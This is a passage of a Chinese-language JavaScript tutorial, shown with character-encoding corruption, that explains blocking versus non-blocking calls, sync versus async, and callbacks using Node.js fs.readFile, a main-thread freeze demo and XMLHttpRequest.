å°±è·Ÿç¾é£Ÿè¡—éœ€è¦é€éå‘¼å«å™¨ä¾†é€šçŸ¥é¤é»å®Œæˆä¸€æ¨£ï¼Œåœ¨ JavaScript æƒ³è¦åšåˆ°éé˜»å¡ï¼Œä½ å¿…é ˆæä¾›ä¸€å€‹å‘¼å«å™¨çµ¦é€™å€‹è®€å–æª”æ¡ˆçš„ methodï¼Œé€™æ¨£å®ƒæ‰èƒ½åœ¨æª”æ¡ˆè®€å–å®Œç•¢æ™‚ä¾†é€šçŸ¥ä½ ã€‚åœ¨ JavaScript è£¡é¢ï¼Œfunction å°±å¾ˆé©åˆç•¶ä½œå‘¼å«å™¨ï¼
æ„æ€å°±æ˜¯ã€Œç•¶æª”æ¡ˆè®€å–å®Œç•¢æ™‚ï¼Œè«‹ä¾†åŸ·è¡Œé€™å€‹ functionï¼Œä¸¦ä¸”æŠŠçµæœå‚³é€²ä¾†ã€ï¼Œè€Œé€™å€‹ function åˆè¢«ç¨±ä½œ callback functionï¼ˆå›å‘¼å‡½å¼ï¼‰ï¼Œæœ‰æ²’æœ‰çªç„¶è¦ºå¾—é€™åå­—å–å¾—çœŸå¥½ï¼Ÿ
Node.js è£¡çš„ fs æ¨¡çµ„é™¤äº†readFileSyncé€™ä¸€å€‹ blocking çš„ method ä»¥å¤–ï¼Œé‚„æä¾›äº†å¦ä¸€å€‹å«åšreadFileçš„ methodï¼Œå°±æ˜¯æˆ‘å€‘å‰é¢æåˆ°çš„éé˜»å¡ç‰ˆæœ¬çš„è®€å–æª”æ¡ˆï¼Œæˆ‘å€‘ä¾†çœ‹çœ‹ç¨‹å¼ç¢¼é•·ä»€éº¼æ¨£å­ï¼š
// è®€å–å…§å»º fs æ¨¡çµ„const fs = require(&#x27;fs&#x27;)  // å®šç¾©è®€å–æª”æ¡ˆå®Œæˆä»¥å¾Œï¼Œè¦åŸ·è¡Œçš„ functionfunction readFileFinished(err, data) &#123;  if (err) &#123;    console.log(err)  &#125; else &#123;    console.log(data)  &#125;&#125;  // è®€å–æª”æ¡ˆï¼Œç¬¬äºŒå€‹åƒæ•¸æ˜¯ callback functionfs.readFile(&#x27;./README.md&#x27;, readFileFinished);

å¯ä»¥çœ‹å¾—å‡ºä¾†readFileçš„ç”¨æ³•è·ŸreadFileSyncå·®ä¸å¤šï¼Œä½†å·®åˆ¥åœ¨æ–¼ï¼š

readFileå¤šäº†ä¸€å€‹åƒæ•¸ï¼Œè€Œä¸”è¦å‚³é€²åƒæ•¸çš„æ˜¯ä¸€å€‹ function
readFileSyncæœ‰å›å‚³å€¼ï¼Œå›å‚³å€¼å°±æ˜¯æª”æ¡ˆå…§å®¹ï¼ŒreadFileçœ‹èµ·ä¾†æ²’æœ‰

é€™å°±å‘¼æ‡‰åˆ°æˆ‘ä¸Šé¢æ‰€èªªçš„ï¼Œblocking èˆ‡ non-blocking çš„å·®åˆ¥å°±åœ¨æ–¼ blocking çš„ method æœƒç›´æ¥å›å‚³çµæœï¼ˆä¹Ÿæ˜¯å› ç‚ºé€™æ¨£æ‰€ä»¥æ‰æœƒé˜»å¡ï¼‰ï¼Œä½† non-blocking çš„ method åŸ·è¡Œå®Œ function ä»¥å¾Œå°±å¯ä»¥ç›´æ¥è·³ä¸‹ä¸€è¡Œäº†ï¼Œæª”æ¡ˆè®€å–å®Œç•¢ä»¥å¾ŒæœƒæŠŠçµæœå‚³é€² callback functionã€‚
åœ¨ä¸Šé¢çš„ç¨‹å¼ç¢¼ä¸­ï¼ŒreadFileFinished å°±æ˜¯ callback functionï¼Œå°±æ˜¯ç¾é£Ÿè¡—çš„å‘¼å«å™¨ã€‚ã€Œç­‰é¤é»å¥½äº†ï¼Œè®“å‘¼å«å™¨éŸ¿ã€å°±è·Ÿã€Œç­‰æª”æ¡ˆè®€å–å®Œç•¢ï¼Œè®“ callback è¢«å‘¼å«ã€æ˜¯ä¸€æ¨£çš„äº‹æƒ…ã€‚
æ‰€ä»¥é€™ä¸€è¡Œï¼šfs.readFile(&#39;./README.md&#39;, readFileFinished)çš„ç™½è©±æ–‡è§£é‡‹å¾ˆç°¡å–®ï¼Œå°±æ˜¯ï¼šã€Œè«‹å»è®€å–./README.mdé€™å€‹æª”æ¡ˆï¼Œä¸¦ä¸”åœ¨è®€å–å®Œç•¢ä»¥å¾Œå‘¼å«readFileFinishedï¼ŒæŠŠçµæœå‚³é€²å»ã€ã€‚
é‚£æˆ‘æ€éº¼çŸ¥é“çµæœæœƒæ€éº¼å‚³é€²ä¾†ï¼Ÿé€™å°±è¦çœ‹ API æ–‡ä»¶äº†ï¼Œæ¯å€‹ method å‚³é€²ä¾†çš„åƒæ•¸éƒ½ä¸ä¸€æ¨£ï¼Œä»¥readFileä¾†èªªï¼Œå®˜æ–¹æ–‡ä»¶æ˜¯é€™æ¨£å¯«çš„ï¼š

è£¡é¢æ¸…æ¥šå¯«åˆ° callback çš„ç¬¬ä¸€å€‹åƒæ•¸æ˜¯ errï¼Œç¬¬äºŒå€‹åƒæ•¸æ˜¯ dataï¼Œä¹Ÿå°±æ˜¯æª”æ¡ˆå…§å®¹ã€‚
æ‰€ä»¥fs.readFileåšçš„äº‹æƒ…å¾ˆç°¡å–®ï¼Œå°±æ˜¯ä»¥æŸç¨®ä¸æœƒé˜»å¡çš„æ–¹å¼å»è®€å–æª”æ¡ˆï¼Œä¸¦ä¸”åœ¨è®€å–å®Œæˆä¹‹å¾Œå‘¼å« callback function ä¸¦ä¸”æŠŠçµæœå‚³é€²å»ã€‚
é€šå¸¸ callback function éƒ½æœƒä½¿ç”¨åŒ¿åå‡½å¼ï¼ˆAnonymous functionï¼‰çš„å¯«æ³•è®“å®ƒè®Šå¾—æ›´ç°¡å–®ï¼Œæ‰€ä»¥æ¯”è¼ƒå¸¸è¦‹çš„å½¢å¼å…¶å¯¦æ˜¯é€™æ¨£ï¼š
// è®€å–å…§å»º fs æ¨¡çµ„const fs = require(&#x27;fs&#x27;)  // è®€å–æª”æ¡ˆfs.readFile(&#x27;./README.md&#x27;, function(err, data) &#123;  if (err) &#123;    console.log(err)  &#125; else &#123;    console.log(data)  &#125;&#125;);

å¯ä»¥æƒ³æˆå°±æ˜¯ç›´æ¥åœ¨ç¬¬äºŒå€‹åƒæ•¸çš„åœ°æ–¹å®£å‘Šä¸€å€‹ function å•¦ï¼Œå› ç‚ºæ²’æœ‰åç¨±ä¹Ÿä¸ç”¨çµ¦åç¨±ï¼Œæ‰€ä»¥å°±å«åšåŒ¿åå‡½å¼ã€‚
è€ŒreadFileæ—¢ç„¶ä¸æœƒé˜»å¡ï¼Œå°±ä»£è¡¨å¾Œé¢çš„ç¨‹å¼ç¢¼æœƒç«‹åˆ»åŸ·è¡Œï¼Œå› æ­¤æˆ‘å€‘ä¾†æŠŠå‰é¢æ‰¾å¶æ•¸çš„ç‰ˆæœ¬æ”¹å¯«æˆéé˜»å¡çœ‹çœ‹ï¼š
const fs = require(&#x27;fs&#x27;)  /*  åŸä¾†çš„é˜»å¡ç‰ˆæœ¬ï¼š    const file = fs.readFileSync(&#x27;./README.md&#x27;) // åœ¨é€™é‚Šç­‰å¥½å¹¾ç§’æ‰å¾€ä¸‹åŸ·è¡Œ*/  fs.readFile(&#x27;./README.md&#x27;, function(err, data) &#123;  if (err) &#123;    console.log(err)  &#125; else &#123;    console.log(data)  &#125;&#125;);  const arr = []for (let i = 2; i &lt;= 99999999; i+=2) &#123;  arr.push(i)&#125;  console.log(arr)

é€™æ¨£å­åœ¨ç­‰å¾…è®€æª”çš„é‚£å¹¾ç§’é˜ï¼Œç³»çµ±å°±å¯ä»¥å…ˆå¾€ä¸‹åŸ·è¡Œåšå…¶ä»–äº‹æƒ…ï¼Œä¸éœ€è¦å¡åœ¨é‚£é‚Šã€‚
å¹«å¤§å®¶é‡é»å›é¡§ä¸€ä¸‹ï¼š

é˜»å¡ï¼ˆblockingï¼‰ä»£è¡¨åŸ·è¡Œæ™‚ç¨‹å¼æœƒå¡åœ¨é‚£ä¸€è¡Œï¼Œç›´åˆ°æœ‰çµæœç‚ºæ­¢ï¼Œä¾‹å¦‚èªªreadFileSyncï¼Œè¦ç­‰æª”æ¡ˆè®€å–å®Œç•¢æ‰èƒ½åŸ·è¡Œä¸‹ä¸€è¡Œ
éé˜»å¡ï¼ˆnon-blockingï¼‰ä»£è¡¨åŸ·è¡Œæ™‚ä¸æœƒå¡ä½ï¼Œä½†åŸ·è¡Œçµæœä¸æœƒæ”¾åœ¨å›å‚³å€¼ï¼Œè€Œæ˜¯éœ€è¦é€éå›å‘¼å‡½å¼ï¼ˆcallback functionï¼‰ä¾†æ¥æ”¶çµæœ

åŒæ­¥èˆ‡éåŒæ­¥è®€åˆ°é€™é‚Šï¼Œä½ å¯èƒ½æœƒç–‘æƒ‘èªªï¼šã€Œä¸æ˜¯èªªè¦è¬›åŒæ­¥ï¼ˆsynchronousï¼‰èˆ‡éåŒæ­¥ï¼ˆasynchronousï¼‰å—ï¼Ÿæ€éº¼é‚„æ²’å‡ºç¾ï¼Ÿã€
å…¶å¯¦å·²ç¶“è¬›å®Œäº†ã€‚
Node.js çš„å®˜æ–¹æ–‡ä»¶æ˜¯é€™éº¼èªªçš„ï¼š

Blocking methods execute synchronously and non-blocking methods execute asynchronously.


é˜»å¡çš„æ–¹æ³•æœƒåŒæ­¥åœ°ï¼ˆsynchronouslyï¼‰åŸ·è¡Œï¼Œè€Œéé˜»å¡çš„æ–¹æ³•æœƒéåŒæ­¥åœ°ï¼ˆasynchronouslyï¼‰åŸ·è¡Œ

readFileSyncæœ€å¾Œé¢çš„ Sync å°±æ˜¯ä»£è¡¨synchronousçš„æ„æ€ï¼Œèªªæ˜é€™å€‹æ–¹æ³•æ˜¯åŒæ­¥çš„ã€‚è€ŒreadFileå‰‡æ˜¯éåŒæ­¥çš„ã€‚
å¦‚æœç¡¬è¦ç”¨ä¸­æ–‡å­—é¢ä¸Šçš„æ„æ€å»è§£é‡‹ï¼Œæœƒéå¸¸çš„ç—›è‹¦ï¼Œæœƒæƒ³èªªï¼šã€ŒåŒæ­¥ä¸æ˜¯åŒæ™‚é€²è¡Œå—ï¼Ÿæ„Ÿè¦ºæ¯”è¼ƒåƒæ˜¯éé˜»å¡é˜¿ï¼Œä½†æ€éº¼å»åéä¾†äº†ï¼Ÿã€
æˆ‘å¾ç¨‹å¼è¨­è¨ˆè©²åŒæ­¥é‚„æ˜¯éåŒæ­¥ï¼Ÿå¾—åˆ°äº†ä¸€å€‹å•Ÿç™¼ï¼Œé‚£å°±æ˜¯åªè¦æ›å€‹æ–¹å¼è§£é‡‹ã€ŒåŒæ­¥ã€åœ¨é›»è…¦çš„é ˜åŸŸä¸­ä»£è¡¨çš„æ„æ€å°±è¡Œäº†ã€‚
ç¾åœ¨è«‹æƒ³åƒæœ‰ä¸€ç¾¤äººè…³ç¶åœ¨ä¸€èµ·ï¼Œåœ¨ç©å…©äººä¸‰è…³ã€‚é€™æ™‚å€™æˆ‘å€‘è‹¥æ˜¯æƒ³è®“ä»–å€‘ã€Œçµ±ä¸€æ­¥ä¼ã€ï¼Œä¹Ÿå°±æ˜¯å¤§å®¶çš„è…³æ­¥ä¸€è‡´ï¼ˆåŒæ­¥ï¼‰ï¼Œè©²æ€éº¼åšå‘¢ï¼Ÿç•¶ç„¶æ˜¯å¤§å®¶äº’ç›¸å”èª¿äº’ç›¸ç­‰å¾…å•Šï¼Œè…³é€Ÿæ¯”è¼ƒå¿«çš„è¦æ”¾æ…¢ï¼Œæ¯”è¼ƒæ…¢çš„è¦è®Šå¿«ã€‚å¦‚æœä½ å·²ç¶“è¸äº†ç¬¬ä¸€æ­¥ï¼Œè¦ç­‰é‚„æ²’è¸å‡ºç¬¬ä¸€æ­¥çš„ï¼Œç­‰åˆ°å¤§å®¶éƒ½è¸å‡ºç¬¬ä¸€æ­¥ä¹‹å¾Œï¼Œæ‰èƒ½é–‹å§‹è¸å‡ºç¬¬äºŒæ­¥ã€‚
æ‰€ä»¥ä¸åŒçš„äººåœ¨å”èª¿å½¼æ­¤çš„æ­¥ä¼ï¼Œè©¦è‘—è®“å¤§å®¶çš„è…³æ­¥ä¸€è‡´ï¼Œå°±å¿…é ˆäº’ç›¸ç­‰å¾…ï¼Œé€™å€‹å°±æ˜¯åŒæ­¥ã€‚
éåŒæ­¥å°±å¾ˆç°¡å–®äº†ï¼Œå°±æ˜¯æ„æ€åéä¾†ã€‚é›–ç„¶åœ¨ç©å…©äººä¸‰è…³ï¼Œä½†æ²’æœ‰æƒ³è¦ç­‰å½¼æ­¤çš„æ„æ€ï¼Œå¤§å®¶éƒ½å„è¸å„çš„ï¼Œæ‰€ä»¥æœ‰å¯èƒ½æ’é ­å·²ç¶“åˆ°çµ‚é»äº†ï¼Œæ’å°¾é‚„åœ¨ä¸­é–“çš„åœ°æ–¹ï¼Œå› ç‚ºå¤§å®¶è…³æ­¥ä¸ä¸€è‡´ï¼Œä¸åŒæ­¥ã€‚
ç¨‹å¼ä¹Ÿæ˜¯ä¸€æ¨£çš„ï¼Œå‰é¢æéçš„åˆè¦è®€æª”åˆè¦å°å‡ºå¶æ•¸çš„ç¯„ä¾‹ä¸­ï¼ŒåŒæ­¥æŒ‡çš„å°±æ˜¯å½¼æ­¤äº’ç›¸å”èª¿äº’ç›¸ç­‰å¾…ï¼Œæ‰€ä»¥è®€æª”é‚„æ²’å®Œæˆçš„æ™‚å€™ï¼Œæ˜¯ä¸èƒ½å°å¶æ•¸çš„ï¼Œå°å‡ºå¶æ•¸ä¸€å®šè¦ç­‰åˆ°è®€å–æª”æ¡ˆçµæŸä¹‹å¾Œæ‰èƒ½é€²è¡Œã€‚
éåŒæ­¥å°±æ˜¯èªªå„åšå„çš„ï¼Œä½ è®€æª”å°±è®€ä½ çš„ï¼Œæˆ‘ç¹¼çºŒå°æˆ‘çš„å¶æ•¸ï¼Œå¤§å®¶è…³æ­¥ä¸ä¸€è‡´æ²’é—œä¿‚ï¼Œå› ç‚ºæˆ‘å€‘æœ¬ä¾†å°±ä¸åŒæ­¥ã€‚
ç¸½ä¹‹å‘¢ï¼Œåœ¨è¨è«–åˆ° JavaScript çš„åŒæ­¥èˆ‡éåŒæ­¥å•é¡Œæ™‚ï¼ŒåŸºæœ¬ä¸Šä½ å¯ä»¥æŠŠéåŒæ­¥è·Ÿéé˜»å¡åŠƒä¸Šç­‰è™Ÿï¼ŒåŒæ­¥èˆ‡é˜»å¡åŠƒä¸Šç­‰è™Ÿã€‚å¦‚æœä½ ä»Šå¤©åŸ·è¡Œä¸€å€‹åŒæ­¥çš„æ–¹æ³•ï¼ˆä¾‹å¦‚èªªreadFileSyncï¼‰ï¼Œå°±ä¸€å®šæœƒé˜»å¡ï¼›å¦‚æœåŸ·è¡Œä¸€å€‹éåŒæ­¥çš„æ–¹æ³•ï¼ˆreadFileï¼‰ï¼Œå°±ä¸€å®šä¸æœƒé˜»å¡ã€‚
ä¸éè¦å¹«å¤§å®¶ç¨å¾®è£œå……ä¸€ä¸‹ï¼Œå¦‚æœä½ ä¸æ˜¯åœ¨ JavaScript è€Œæ˜¯åœ¨å…¶ä»–çš„å±¤æ¬¡è¨è«–é€™å€‹å•é¡Œæ™‚ï¼Œç­”æ¡ˆå°±ä¸ä¸€æ¨£äº†ã€‚èˆ‰ä¾‹ä¾†èªªï¼Œç•¶ä½ åœ¨æŸ¥é˜»å¡éé˜»å¡ä»¥åŠåŒæ­¥éåŒæ­¥çš„æ™‚å€™ï¼Œä¸€å®šæœƒæŸ¥åˆ°ä¸€äº›è·Ÿç³»çµ± I&#x2F;O æœ‰é—œçš„è³‡æ–™ï¼Œæˆ‘è¦ºå¾—é‚£æ˜¯ä¸åŒå±¤æ¬¡çš„è¨è«–ã€‚
ç•¶ä½ æ˜¯åœ¨è¨è«–ç³»çµ±æˆ–æ˜¯ç¶²è·¯ I&#x2F;O çš„æ™‚å€™ï¼ŒéåŒæ­¥è·Ÿéé˜»å¡è¬›çš„å°±æ˜¯å…©ä»¶äº‹æƒ…ï¼ŒåŒæ­¥è·Ÿé˜»å¡ä¹Ÿæ˜¯å…©ä»¶äº‹ï¼Œæ˜¯æœ‰ä¸åŒå«ç¾©çš„ã€‚
ä½†å¦‚æœæˆ‘å€‘çš„ context ä¾·é™åœ¨è¨è«– JavaScript çš„åŒæ­¥èˆ‡éåŒæ­¥å•é¡Œï¼ŒåŸºæœ¬ä¸Š blocking å°±æ˜¯ synchronousï¼Œnon-blocking å°±æ˜¯ asynchronousã€‚å‰é¢æåˆ°çš„ Node.js çš„å®˜æ–¹æ–‡ä»¶ä¹Ÿæ˜¯æŠŠé€™å…©å€‹æ¦‚å¿µçµ¦æ··ç”¨ã€‚
ä¸€æ—¦æˆ‘å€‘æŠŠé€™å…©å€‹æ±è¥¿åŠƒä¸Šç­‰è™Ÿï¼Œå°±å¾ˆå¥½ç†è§£ä»€éº¼æ˜¯åŒæ­¥ï¼Œä»€éº¼æ˜¯éåŒæ­¥äº†ï¼Œæˆ‘ç›´æ¥æŠŠä¸Šä¸€å€‹æ®µè½çš„é‡é»å›é¡§æ”¹ä¸€ä¸‹å°±è¡Œäº†ï¼š

åŒæ­¥ï¼ˆsynchronousï¼‰ä»£è¡¨åŸ·è¡Œæ™‚ç¨‹å¼æœƒå¡åœ¨é‚£ä¸€è¡Œï¼Œç›´åˆ°æœ‰çµæœç‚ºæ­¢ï¼Œä¾‹å¦‚èªªreadFileSyncï¼Œè¦ç­‰æª”æ¡ˆè®€å–å®Œç•¢æ‰èƒ½åŸ·è¡Œä¸‹ä¸€è¡Œ
éåŒæ­¥ï¼ˆasynchronousï¼‰ä»£è¡¨åŸ·è¡Œæ™‚ä¸æœƒå¡ä½ï¼Œä½†åŸ·è¡Œçµæœä¸æœƒæ”¾åœ¨å›å‚³å€¼ï¼Œè€Œæ˜¯éœ€è¦é€éå›å‘¼å‡½å¼ï¼ˆcallback functionï¼‰ä¾†æ¥æ”¶çµæœ

ç€è¦½å™¨ä¸Šçš„åŒæ­¥èˆ‡éåŒæ­¥å‰é¢éƒ½æ˜¯ä»¥ Node.js ç•¶åšä¾‹å­ï¼Œç¾åœ¨çµ‚æ–¼è¦å›æ­¸åˆ°æˆ‘å€‘æ¯”è¼ƒç†Ÿæ‚‰çš„å‰ç«¯ç€è¦½å™¨äº†ã€‚
åœ¨å‰ç«¯å¯« JavaScript çš„æ™‚å€™æœ‰ä¸€å€‹å¾ˆå¸¸è¦‹çš„éœ€æ±‚ï¼Œé‚£å°±æ˜¯è·Ÿå¾Œç«¯ API ä¸²æ¥æ‹¿å–è³‡æ–™ã€‚å‡è¨­æˆ‘å€‘æœ‰ä¸€å€‹å‡½å¼å«åšgetAPIResponseå¥½äº†ï¼Œå¯ä»¥ call API æ‹¿è³‡æ–™å›ä¾†ã€‚
åŒæ­¥çš„ç‰ˆæœ¬æœƒé•·å¾—åƒé€™æ¨£ï¼š
const response = getAPIResponse()console.log(response)

åŒæ­¥æœƒç™¼ç”Ÿä»€éº¼äº‹ï¼Ÿå°±æœƒé˜»å¡å¾Œé¢çš„åŸ·è¡Œï¼Œæ‰€ä»¥å‡è¨­ API Server ä¸»æ©Ÿè¦æ ¼å¾ˆçˆ›è·‘å¾ˆæ…¢éœ€è¦ç­‰ 10 ç§’ï¼Œæ•´å€‹ JavaScript å¼•æ“éƒ½å¿…é ˆç­‰ 10 ç§’ï¼Œæ‰èƒ½åŸ·è¡Œä¸‹ä¸€å€‹æŒ‡ä»¤ã€‚åœ¨æˆ‘å€‘ç”¨ Node.js ç•¶ç¯„ä¾‹çš„æ™‚å€™ï¼Œæœ‰æ™‚å€™ç­‰ 10 ç§’æ˜¯å¯ä»¥æ¥å—çš„ï¼Œå› ç‚ºåªæœ‰åŸ·è¡Œé€™å€‹ç¨‹å¼çš„äººéœ€è¦ç­‰ 10 ç§’è€Œå·²ï¼Œæˆ‘å¯ä»¥å»æ»‘å€‹ Instagram å†å›ä¾†å°±å¥½ã€‚
å¯æ˜¯ç€è¦½å™¨å¯ä»¥æ¥å—ç­‰ 10 ç§’å—ï¼Ÿ
ä½ æƒ³æƒ³çœ‹å–”ï¼Œå¦‚æœæŠŠ JavaScript çš„åŸ·è¡Œå‡çµåœ¨é‚£é‚Š 10 ç§’ï¼Œå°±ç­‰æ–¼èªªè®“åŸ·è¡Œ JavaScript çš„åŸ·è¡Œç·’ï¼ˆthreadï¼‰å‡çµ 10 ç§’ã€‚åœ¨ç€è¦½å™¨è£¡é¢ï¼Œè² è²¬åŸ·è¡Œ JavaScript çš„å«åš main threadï¼Œè² è²¬è™•ç†è·Ÿç•«é¢æ¸²æŸ“ç›¸é—œçš„ä¹Ÿæ˜¯ main threadã€‚æ›å¥è©±èªªï¼Œå¦‚æœé€™å€‹ thread å‡çµ 10 ç§’ï¼Œå°±ä»£è¡¨ä½ æ€éº¼é»æ“Šç•«é¢éƒ½ä¸æœƒæœ‰åæ‡‰ï¼Œå› ç‚ºç€è¦½å™¨æ²’æœ‰è³‡æºå»è™•ç†é€™äº›å…¶ä»–çš„äº‹æƒ…ã€‚
ä¹Ÿå°±æ˜¯èªªï¼Œä½ çš„ç•«é¢çœ‹èµ·ä¾†å°±åƒç•¶æ‰äº†ä¸€æ¨£ã€‚
ï¼ˆå¦‚æœä¸çŸ¥é“ä»€éº¼æ˜¯ threadï¼Œè«‹åƒè€ƒï¼šInside look at modern web browserï¼Œå»ºè­°å¾ part1 é–‹å§‹è®€ï¼Œmain thread åœ¨ part3 çš„åœ°æ–¹ï¼‰
èˆ‰ä¸€å€‹ç”Ÿæ´»ä¸­çš„ä¾‹å­ä¾†æ¯”å–»ï¼Œå¦‚æœä½ å»ä½ å®¶å··å£çš„åº—é¢é»ä¸€å¡Šé›æ’ï¼Œé»å®Œä¹‹å¾Œä¸€å®šè¦åœ¨ç¾å ´ç­‰ï¼Œé€™æ™‚å€™å¦‚æœä½ æœ‹å‹ä¾†æ‰¾ä½ ç©ï¼ŒæŒ‰ä½ å®¶é–€éˆ´ï¼Œä½ å°±æ²’è¾¦æ³•å›æ‡‰ï¼Œå› ç‚ºä½ ä¸åœ¨å®¶ã€‚æ‰€ä»¥ä½ æœ‹å‹åªå¥½ä¹¾ç­‰åœ¨é‚£é‚Šï¼Œç­‰ä½ è²·å®Œé›æ’æ‰èƒ½å¹«ä»–å€‘é–‹é–€ã€‚
ä½†å¦‚æœåº—å®¶å°å…¥äº†ç·šä¸Šæ’éšŠç³»çµ±ï¼Œé»å®Œé›æ’ä¹‹å¾Œå¯ä»¥é€é App æŸ¥çœ‹é›æ’è£½ä½œç‹€æ³ï¼Œé‚£ä½ å°±å¯ä»¥å›å®¶é‚Šçœ‹é›»è¦–é‚Šç­‰é›æ’ï¼Œé€™æ™‚å€™å¦‚æœæœ‹å‹ä¾†æŒ‰é–€éˆ´ï¼Œä½ å°±å¯ä»¥ç›´æ¥å¹«ä»–å€‘é–‹é–€ï¼Œä½ æœ‹å‹ä¸ç”¨ä¹¾ç­‰ã€‚
ã€Œç­‰é›æ’ã€æŒ‡çš„å°±æ˜¯ã€Œç­‰å¾… Responseã€ï¼Œã€Œå¹«ä½ æœ‹å‹é–‹é–€ã€æŒ‡çš„å°±æ˜¯ã€Œé‡å°ç•«é¢çš„åæ‡‰ã€ï¼Œè€Œã€Œä½ ã€å°±æ˜¯ã€Œmain threadã€ã€‚åœ¨ä½ å¿™è‘—ç­‰é›æ’çš„æ™‚å€™ï¼Œæ˜¯æ²’è¾¦æ³•å¹«æœ‹å‹é–‹é–€çš„ã€‚
ç•«é¢å‡çµçš„éƒ¨åˆ†å¯ä»¥è‡ªå·±åšä¸€å€‹å¾ˆç°¡å–®çš„ demo ä¾†é©—è­‰ï¼Œåªè¦å»ºç«‹ä¸€å€‹é€™æ¨£çš„ html æª”æ¡ˆå°±å¥½äº†ï¼š
&lt;!DOCTYPE html&gt;&lt;html&gt;  &lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;  &lt;/head&gt;  &lt;body&gt;    &lt;div&gt;å‡çµé‚£æ™‚é–“ï¼Œå‡çµåˆé‡é‚£ä¸€å¤©&lt;/div&gt;  &lt;/body&gt;  &lt;script&gt;    var delay = 3000 // å‡çµ 3 ç§’    var end = +new Date() + delay    console.log(&#x27;delay start&#x27;)    while(new Date() &lt; end) &#123;    &#125;    console.log(&#x27;delay end&#x27;)  &lt;/script&gt;&lt;/html&gt;

åŸç†å°±æ˜¯è£¡é¢çš„ while æœƒä¸æ–·å»æª¢æŸ¥æ™‚é–“åˆ°äº†æ²’ï¼Œæ²’åˆ°çš„è©±å°±ç¹¼çºŒç­‰ï¼Œæ‰€ä»¥æœƒé˜»å¡æ•´å€‹ main threadã€‚ä¹Ÿå¯ä»¥åƒè€ƒåº•ä¸‹çš„ gifï¼Œåœ¨ delay end å‡ºç¾ä¹‹å‰ï¼Œæ€éº¼åç™½æ–‡å­—éƒ½æ²’æœ‰ç”¨ï¼Œç›´åˆ° delay end å‡ºç¾ä»¥å¾Œæ‰æ­£å¸¸ï¼š

ä½ å¯ä»¥æ¥å—ç•«é¢å‡çµå—ï¼Ÿä¸è¡Œå˜›ï¼Œå°±ç®—ä½ å¯ä»¥æ¥å—ï¼Œä½ è€é—†ã€ä½ å®¢æˆ¶ä¹Ÿä¸å¯èƒ½æ¥å—ï¼Œæ‰€ä»¥åƒæ˜¯ç¶²è·¯é€™éº¼è€—æ™‚çš„æ“ä½œï¼Œæ˜¯ä¸å¯èƒ½è®“å®ƒåŒæ­¥åŸ·è¡Œçš„ã€‚æ—¢ç„¶è¦æ”¹æˆéåŒæ­¥ï¼Œé‚£ä¾æ“šä¹‹å‰å­¸éçš„ï¼Œå°±è¦æ”¹æˆç”¨ callback function ä¾†æ¥æ”¶çµæœï¼š
// åº•ä¸‹æœƒæœ‰ä¸‰å€‹ç¯„ä¾‹ï¼Œéƒ½åœ¨åšä¸€æ¨¡ä¸€æ¨£çš„äº‹æƒ…// ä¸»è¦æ˜¯æƒ³è®“åˆå­¸è€…çŸ¥é“åº•ä¸‹ä¸‰å€‹æ˜¯ä¸€æ¨£çš„ï¼Œåªæ˜¯å¯«æ³•ä¸åŒ  // ç¯„ä¾‹ä¸€// æœ€åˆå­¸è€…å‹å–„çš„ç‰ˆæœ¬ï¼Œé¡å¤–å®£å‘Šå‡½å¼function handleResponst() &#123;  console.log(response)&#125;getAPIResponse(handleResponst)  // ç¯„ä¾‹äºŒ// æ¯”è¼ƒå¸¸çœ‹åˆ°çš„åŒ¿åå‡½å¼ç‰ˆæœ¬ï¼ŒåŠŸèƒ½è·Ÿä¸Šé¢å®Œå…¨ä¸€æ¨£getAPIResponse(function(err, response) &#123;  console.log(response)&#125;)  // ç¯„ä¾‹ä¸‰// åˆ©ç”¨ ES6 ç®­é ­å‡½å¼ç°¡åŒ–éå¾Œçš„ç‰ˆæœ¬getAPIResponse((err, response) =&gt; &#123;  console.log(response)&#125;)

AJAX çš„å…¨åæ˜¯ï¼šAsynchronous JavaScript and XMLï¼Œæœ‰æ²’æœ‰çœ‹åˆ°é–‹é ­é‚£å€‹ A çš„å…¨åæ˜¯ï¼šAsynchronousï¼Œå°±ä»£è¡¨æ˜¯éåŒæ­¥é€å‡º Request çš„æ„æ€ã€‚
ä¸Šé¢æˆ‘å€‘ç”¨äº†ä¸€å€‹å‡æƒ³ä¸­çš„å‡½å¼ getAPIResponse ä¾†åšç¤ºç¯„ï¼Œä¸»è¦æ˜¯æƒ³èªªæ˜ã€Œç¶²è·¯æ“ä½œåœ¨å‰ç«¯ä¸å¯èƒ½ç”¨åŒæ­¥çš„æ–¹å¼ã€ï¼Œæ¥è‘—å¯ä»¥ä¾†çœ‹ä¸€ä¸‹å¯¦éš›åœ¨å‰ç«¯å‘¼å«å¾Œç«¯ API çš„ç¨‹å¼ç¢¼æœƒé•·ä»€éº¼æ¨£å­ï¼š
var request = new XMLHttpRequest();request.open(&#x27;GET&#x27;, &#x27;https://jsonplaceholder.typicode.com/users/1&#x27;, true);  request.onload = function() &#123;  if (this.status &gt;= 200 &amp;&amp; this.status &lt; 400) &#123;    console.log(this.response)  &#125;&#125;;  request.send();

ä½ å¯èƒ½æœƒæƒ³èªªï¼šå’¦ï¼Œæ€éº¼çœ‹èµ·ä¾†ä¸å¤ªä¸€æ¨£ï¼Ÿcallback function åœ¨å“ªè£¡ï¼Ÿ
é€™é‚Šçš„ callback function å°±æ˜¯ request.onload =  å¾Œé¢çš„é‚£å€‹å‡½å¼ï¼Œé€™ä¸€è¡Œçš„æ„æ€å°±æ˜¯èªªï¼šã€Œç•¶ response å›ä¾†æ™‚ï¼Œè«‹åŸ·è¡Œé€™å€‹å‡½å¼ã€ã€‚
æ­¤æ™‚ï¼Œçœ¼å°–çš„äººå¯èƒ½æœƒç™¼ç¾ï¼šã€Œå’¦ï¼Ÿæ€éº¼request.onloadé€™å€‹å½¢å¼æœ‰é»çœ¼ç†Ÿï¼Ÿã€
ä½ ä»¥ç‚ºé™Œç”Ÿå»ç†Ÿæ‚‰çš„ callbackcallback function çš„æ„æ€å…¶å¯¦å°±æ˜¯ï¼šã€Œç•¶æŸäº‹ç™¼ç”Ÿçš„æ™‚å€™ï¼Œè«‹åˆ©ç”¨é€™å€‹ function é€šçŸ¥æˆ‘ã€ï¼Œé›–ç„¶ä¹çœ‹ä¹‹ä¸‹æœƒä»¥ç‚ºå¾ˆé™Œç”Ÿï¼Œä½†å…¶å¯¦ä½ æ—©å°±åœ¨ç”¨äº†ã€‚
ä¾‹å¦‚èªªï¼š
